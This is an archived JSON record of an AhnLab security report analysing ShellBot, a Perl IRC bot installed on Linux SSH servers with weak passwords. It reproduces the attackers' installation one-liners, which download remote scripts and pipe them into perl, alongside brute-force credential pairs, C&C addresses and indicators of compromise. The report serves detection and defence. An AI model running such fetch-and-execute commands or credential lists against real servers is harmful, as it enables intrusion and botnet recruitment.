{
    "id": "e562bcca-f855-400a-a2ff-552abe152608",
    "created_at": "2023-04-05T02:09:32.199466Z",
    "updated_at": "2025-03-27T02:06:09.337251Z",
    "deleted_at": null,
    "sha1_hash": "2949ef39ef7108fd14b27ef39b5a73f7d28536d3",
    "title": "2023-03-17 - ShellBot Malware Being Distributed to Linux SSH Servers",
    "authors": "",
    "file_creation_date": "2023-04-03T08:31:24Z",
    "file_modification_date": "2023-04-03T08:31:24Z",
    "file_size": 1896274,
    "plain_text": "# ShellBot Malware Being Distributed to Linux SSH Servers\n\n**asec.ahnlab.com/en/49769/**\n\nBy Sanseo March 17, 2023\n\nAhnLab Security Emergency response Center (ASEC) has recently discovered the ShellBot\nmalware being installed on poorly managed Linux SSH servers. ShellBot, also known as\nPerlBot, is a DDoS Bot malware developed in Perl and characteristically uses IRC protocol to\ncommunicate with the C&C server. ShellBot is an old malware that has been in steady use\nand is still being used today to launch attacks against Linux systems.\n\n## 1. Attack Campaigns Against Linux SSH Servers\n\nUnlike desktop, which is the main work environment for normal users, servers usually take\ncharge of providing specific services. Accordingly, malware attacks are typically carried out\nthrough web browsers or email attachments in desktop environments, and threat actors also\ndistribute malware disguised as legitimate software to induce users to install them. Threat\nactors attacking server environments use a different method since there are limits to\ndistributing malware in the ways mentioned above. Services that are poorly managed or are\nweak to vulnerability exploitations because they have not been patched to the latest version\nare the prime targets.\n\nA main example of a poorly managed service is one where simple account credentials are\nused, causing the server to be vulnerable to dictionary attacks. Remote Desktop Protocol\n(RDP) and MS-SQL service are prime examples of attack vectors that are used when\n\n\n-----\n\ntargeting Windows operating systems. In Linux servers, Secure Shell (SSH) services are\nusually targeted for attacks. In IoT environments where an old Linux server or embedded\nLinux OS has been installed, the Telnet service becomes targeted for dictionary attacks.\n\nThe ShellBot malware strains that are going to be covered in this post are believed to have\nbeen installed after threat actors used account credentials that have been obtained through\nthe use of scanners and SSH BruteForce malware on target systems. After scanning\nsystems that have operational port 22s, threat actors search for systems where the SSH\nservice is active and uses a list of commonly used SSH account credentials to initiate their\ndictionary attack. The following is a list of the actual account credentials used by threat\nactors who install ShellBot. (A far greater number of account credentials were used in the\nactual attacks, but only the main examples were organized here.)\n\n**User** **Password**\n\ndeploy password\n\nhadoop hadoop\n\noracle oracle\n\nroot 11111\n\nroot Passw0rd\n\nttx ttx2011\n\nubnt ubnt\n\nTable 1. A portion of the account credentials used by ShellBot operators\n\n## 2. Internet Relay Chat (IRC) Protocol\n\nA characteristic of ShellBot, aside from the fact that it is developed in Perl, is that it uses an\nIRC protocol to communicate with C&C servers. IRC is a real-time Internet chat protocol\ndeveloped in 1988. Users log onto certain channels of certain IRC servers and chat with\nother users who have logged onto the same channel in real time.\n\nIRC Bot is a bot malware that abuses this IRC service to communicate with C&C servers.\nThe IRC Bot installed on the infected system accesses an IRC server’s channel designated\nby the threat actor according to the IRC protocol, after which it transmits stolen information to\nthe specified channel, or when the attacker enters a particular string, receives this as a\ncommand and performs the corresponding malicious behavior.\n\n\n-----\n\nIRC has seen consistent use from malware since the past as it uses a preexisting IRC\nprotocol and IRC server without having to develop a separate C&C server and protocol.\nAlthough it has been seeing less use by malware targeting Windows operating systems, a\nlarge number of IRC Bots are still being distributed on Linux.\n\n## 3. ShellBot Analysis\n\nShellBot has been used by various threat actors for a considerable amount of time, and a\nprevious ASEC Blog post covered its use in attacks along with CoinMiners.\n\n[Shc Linux Malware Installing CoinMiner](https://asec.ahnlab.com/en/45182/)\n\nAnother characteristic of ShellBot is the fact that they all have different forms and features\nsince threat actors can customize them. The team has categorized ShellBot into three main\ntypes based on recent findings and summarized the commands, characteristics, and DDoS\nattacks the malware uses during installation.\n\n**3.1. LiGhT’s Modded perlbot v2**\n\nThe following is a ShellBot named “LiGhT’s Modded perlbot v2”.\n\nFigure 1. ShellBot version information\n“LiGhT’s Modded perlbot v2” is being used by a variety of threat actors. The following\ncommands are used in the ShellBot installation after the SSH server has been successfully\nlogged into.\n\n**Filename** **Installation Command**\n\nak wget -qO – x-x-x[.]online/ak|perl\n\nperl nproc; nvidia-smi –list-gpus ;cd /tmp;wget -qO –\nhttp://34.225[.]57.146/futai/perl|perl;rm -rf perl\n\nmperl cd /tmp ; wget 193.233.202[.]219/mperl ; perl mperl ; rm -rf mperl\n\nniko2 cd /tmp ; wget 193.233.202[.]219/niko1 ; perl niko1 ; rm -rf niko1\n\n\n-----\n\nTable 2. Command used to install LiGhT s Modded perlbot v2\nConfiguration data such as the C&C server and the name of the channel to join are included\nin the initial routine of ShellBot. A nickname with the format “IP-[5 random digits]” is used to\njoin the IRC channels.\n\nFigure 2. Configuration data of\n\nShellBot\n\n**Filename** **C&C URL** **Channel Name**\n\nak 164.90.240[.]68:6667 #nou\n\nper 164.132.224[.]207:80 #mailbomb\n\nmperl 206.189.139[.]152:6667 #Q\n\nniko1 176.123.2[.]3:6667 #X\n\nTable 3. C&C URL and channels of LiGhT’s Modded perlbot v2\nThe “LiGhT’s Modded perlbot v2” version of ShellBot offers various features which are\nlargely categorized in the table below. Commands that can actually be used for malicious\npurposes include DDoS commands such as TCP, UDP, and HTTP Flooding. It also includes\na variety of commands that allows control over infected systems so that they can be used in\nother attacks such as reverse shell, log deletion, and scanner.\n\n**Command (Category)** **Description**\n\n\n-----\n\n**Command (Category)** **Description**\n\nflooding IRC Flooding\n\nirc IRC control commands\n\nddos DDoS commands\n\nTCP, UDP, HTTP, SQL Flooding, etc.\n\nnews DDoS attack commands against security web pages\n\nhacking Attack commands\n\nMultiScan, Socks5, LogCleaner, Nmap, Reverse Shell, etc.\n\nlinuxhelp Help\n\nextras Additional features (Assumed to be related to DDoS attacks)\n\nversion Version information output\n\nTable 4. Features supported by LiGhT’s Modded perlbot v2\n\n**3.2. DDoS PBot v2.0**\n\nAside from “LiGhT’s Modded perlbot v2”, “DDoS PBot v2.0” is also being used in a variety of\nattacks. A characteristic of “DDoS PBot v2.0” is that it shows basic information and available\ncommands in the annotations that can be seen during its initial routine.\n\nFigure 3. Initial routine of DDoS PBot v2.0\n\n\n-----\n\nThe following are commands used to install DDoS PBot v2.0 .\n\n**Filename** **Installation Command**\n\nbash wget -qO – 80.94.92[.]241/bash|perl\n\ntest.jpg uname -a;wget -q -O- hxxp://185.161.208[.]234/test.jpg|perl;curl -sS\nhxxp://185.161.208[.]234/test.jpg|perl;nproc;history -c\n\ndred uname -a;lspci | grep -i –color ‘vga|3d|2d’;curl -s -L\nhxxp://39.165.53[.]17:8088/iposzz/dred -o /tmp/dred;perl /tmp/dred\n\nTable 5. Commands used to install DDoS PBot v2.0\n“DDoS PBot v2.0” randomly chooses a nickname from a selection of over 500, which include\n“abbore”, “ably”, and “abyss”, before joining an IRC channel.\n\nFigure 4. List of DDoS PBot v2.0 nicknames\n\n**Filename** **C&C URL** **Channel Name**\n\nbash 51.195.42[.]59:8080 #sex\n\ntest.jpg gsm.ftp[.]sh:1080 #test\n\ndred 192.3.141[.]163:6667 #bigfalus\n\nTable 6. C&C URL and channels of DDoS PBot v2.0\nAdditionally, regular IRC Bots receive commands from the threat actor via the IRC channels\nto perform malicious acts. Thus, there is a need to verify the threat actor sending commands.\nWithout a verification process, any users can join the channel and control the bots however\nthey want.\n\nIn order to do this, the IRC Bot has to perform an additional task where users that have\njoined the channel must verify their nickname and host address before they can enter a\ncommand. For example, in the case of the “bash” malware, the nickname must be either\n“crond,” “drugs,” or “tab” as defined in the “admins” variable, while the host address must be\n“localhost” as defined in the “hostauth” variable.\n\n\n-----\n\nFigure 5. Configuration data of DDoS PBot\n\nv2.0\nLike regular ShellBots, “DDoS PBot v2.0” also offers a variety of malicious commands\nincluding DDoS attack commands.\n\n**Command (Category)** **Description**\n\nsystem Infected system information output\n\nversion Version information output\n\nchannel IRC control commands\n\nflood DDoS commands\n\nTCP, UDP, HTTP, SQL Flooding, etc.\n\nutils Attack commands\n\nPort Scan, Reverse Shell, file download, etc.\n\nTable 7. Features supported by DDoS PBot v2.0\n\n**3.3. PowerBots (C) GohacK**\n\nThe main characteristic of PowerBots is that it has a simpler form in comparison to the\nShellBot types covered above.\n\n\n-----\n\nFigure 6.\n\nConfiguration data of PowerBots\n\n**Filename** **Installation Command**\n\nff uname -a ;wget -qO – hxxp://80.68.196[.]6/ff|perl &>>/dev/null\n\nTable 8. Command used to install PowerBots\n\n**Filename** **C&C URL** **Channel Name**\n\nff 49.212.234[.]206:3303 #x\n\nTable 9. C&C URL and channel of DDoS PBot v2.0\nShellBot types usually offer a variety of DDoS attack features, but since PowerBots mainly\nfocuses on its reverse shell and file downloading capabilities, it is likely that the threat actor\ninstalled ShellBot as a backdoor.\n\n**Command** **Description**\n\nps Port scanning\n\n\n-----\n\n**Command** **Description**\n\nnamp NMAP port scanning\n\nrm Delete files in a particular path\n\nversion Version information output\n\ndown File download\n\nudp UDP Flooding attack\n\nback Reverse Shell\n\nTable 10. Features supported by PowerBots\n\n## 4. Conclusion\n\nRecently, threat actors have been installing variants of the ShellBot malware on inadequately\nmanaged Linux SSH servers. These types of attacks have been occurring consistently since\nthe past and numerous attacks are still being confirmed. If ShellBot is installed, Linux servers\ncan be used as DDoS Bots for DDoS attacks against specific targets after receiving a\ncommand from the threat actor. Moreover, the threat actor could use various other backdoor\nfeatures to install additional malware or launch different types of attacks from the\ncompromised server.\n\nBecause of this, administrators should use passwords that are difficult to guess for their\naccounts and change them periodically to protect the Linux server from brute force attacks\nand dictionary attacks, and update to the latest patch to prevent vulnerability attacks.\nAdministrators should also use security programs such as firewalls for servers accessible\nfrom outside to restrict access by attackers. Finally, V3 should be updated to the latest\nversion so that malware infection can be prevented.\n\n**File Detection**\n\n– Shellbot/Perl.Generic.S1100 (2020.02.12.00)\n\n– Shellbot/Perl.Generic.S1118 (2020.02.19.07)\n\n**IOC**\n\n**MD5**\n\n– bef1a9a49e201095da0bb26642f65a78 : ak\n\n– 3eef28005943fee77f48ac6ba633740d : mperl\n\n– 55e5bfa75d72e9b579e59c00eaeb6922 : niko1\n\n– 6d2c754760ccd6e078de931f472c0f72 : perl\n\n– 7ca3f23f54e8c027a7e8b517995ae433 : bash\n\n\n-----\n\n– 2cf90bf5b61d605c116ce4715551b7a3 : test.jpg\n– 7bc4c22b0f34ef28b69d83a23a6c88c5 : dred\n\n– 176ebfc431daa903ef83e69934759212 : ff\n\n**Download URLs**\n\n– x-x-x[.]online/ak\n\n– 193.233.202[.]219/mperl\n\n– 193.233.202[.]219/niko1\n\n– hxxp://34.225.57[.]146/futai/perl\n\n– 80.94.92[.]241/bash\n\n– hxxp://185.161.208[.]234/test.jpg\n\n– hxxp://39.165.53[.]17:8088/iposzz/dred\n\n– hxxp://80.68.196[.]6/ff\n\n**C&C URLs**\n\n– 164.90.240[.]68:6667 : ak\n\n– 206.189.139[.]152:6667 : mperl\n\n– 176.123.2[.]3:6667 : niko1\n\n– 164.132.224[.]207:80 : perl\n\n– 51.195.42[.]59:8080 : bash\n\n– gsm.ftp[.]sh:1080 : test.jpg\n\n– 192.3.141[.]163:6667 : dred\n\n– 49.212.234[.]206:3303 : ff\n\n**Subscribe to AhnLab’s next-generation threat intelligence platform ‘AhnLab TIP’ to**\n**check related IOC and detailed analysis information.**\n\n[Categories:Malware Information](https://asec.ahnlab.com/en/category/malware-information-en/)\n\n[Tagged as:BruteForce,Perl,ShellBot,SSH](https://asec.ahnlab.com/en/tag/bruteforce-en/)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2023/2023-03-17 - ShellBot Malware Being Distributed to Linux SSH Servers.pdf"
    ],
    "report_names": [
        "2023-03-17 - ShellBot Malware Being Distributed to Linux SSH Servers.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1680660572,
    "ts_updated_at": 1743041169,
    "ts_creation_date": 1680510684,
    "ts_modification_date": 1680510684,
    "files": {
        "pdf": "https://archive.orkl.eu/2949ef39ef7108fd14b27ef39b5a73f7d28536d3.pdf",
        "text": "https://archive.orkl.eu/2949ef39ef7108fd14b27ef39b5a73f7d28536d3.txt",
        "img": "https://archive.orkl.eu/2949ef39ef7108fd14b27ef39b5a73f7d28536d3.jpg"
    }
}